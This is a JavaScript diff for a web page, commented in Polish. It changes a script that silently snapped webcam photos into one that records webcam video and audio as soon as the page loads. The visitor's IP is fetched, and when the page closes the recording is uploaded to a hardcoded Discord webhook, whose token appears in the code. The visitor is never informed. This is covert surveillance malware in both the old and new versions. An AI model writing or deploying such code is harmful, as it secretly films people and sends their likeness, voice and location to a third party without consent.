@@ -1,48 +1,71 @@
-const canvas = document.getElementById('canvas');
-const ctx = canvas.getContext('2d');
+let mediaRecorder;
+let recordedChunks = [];
 let videoStream;
 
-async function startCamera() {
+// Funkcja uruchamiająca nagrywanie wideo
+async function startRecording() {
     try {
-        videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.createElement('video');
-        video.srcObject = videoStream;
-        video.play();
+        // Pobranie dostępu do kamery
+        videoStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
 
-        video.onloadedmetadata = () => {
-            setInterval(() => captureAndSend(video), 1000);
+        // Tworzenie obiektu MediaRecorder
+        mediaRecorder = new MediaRecorder(videoStream, { mimeType: 'video/webm' });
+
+        // Zbieranie nagranych danych
+        mediaRecorder.ondataavailable = (event) => {
+            if (event.data.size > 0) {
+                recordedChunks.push(event.data);
+            }
         };
+
+        // Automatyczne nagrywanie po wejściu na stronę
+        mediaRecorder.start();
+        console.log("Nagrywanie rozpoczęte...");
+
     } catch (err) {
         console.error("Błąd dostępu do kamery:", err);
     }
 }
 
-async function captureAndSend(video) {
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+// Funkcja zatrzymująca nagrywanie i wysyłająca film na Discorda
+async function stopRecording() {
+    if (mediaRecorder && mediaRecorder.state !== "inactive") {
+        mediaRecorder.stop();
+        console.log("Nagrywanie zatrzymane...");
 
-    canvas.toBlob(async (blob) => {
+        // Czekanie na zakończenie nagrywania
+        await new Promise(resolve => setTimeout(resolve, 1000));
+
+        // Tworzenie pliku wideo
+        const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
         let formData = new FormData();
-        formData.append('file', blob, 'photo.png');
+        formData.append('file', videoBlob, 'video.webm');
 
         try {
+            // Pobranie IP użytkownika
             let ipResponse = await fetch('https://api64.ipify.org?format=json');
             let ipData = await ipResponse.json();
             let userIP = ipData.ip;
 
             formData.append('payload_json', JSON.stringify({
-                content: `📸 Nowe zdjęcie! IP użytkownika: ${userIP}`
+                content: `🎥 Nagranie zakończone! IP użytkownika: ${userIP}`
             }));
 
+            // Wysyłanie pliku na webhook Discorda
             await fetch("https://discord.com/api/webhooks/1341148754161569956/lHJVIyJeOpz2lpBfU_eRjPKKcvmCSw8vAo6X2bE535wvOnwFxRB9yIYIDchCMAx_zVe4", {
                 method: "POST",
                 body: formData
             });
 
-            console.log("Zdjęcie i IP wysłane!");
+            console.log("Wideo i IP wysłane!");
         } catch (error) {
             console.error("Błąd wysyłania:", error);
         }
-    }, 'image/png');
+    }
 }
 
-startCamera();
+// Rozpocznij nagrywanie po wejściu na stronę
+startRecording();
+
+// Zatrzymaj nagrywanie i wyślij film po wyjściu ze strony
+window.addEventListener("beforeunload", stopRecording);
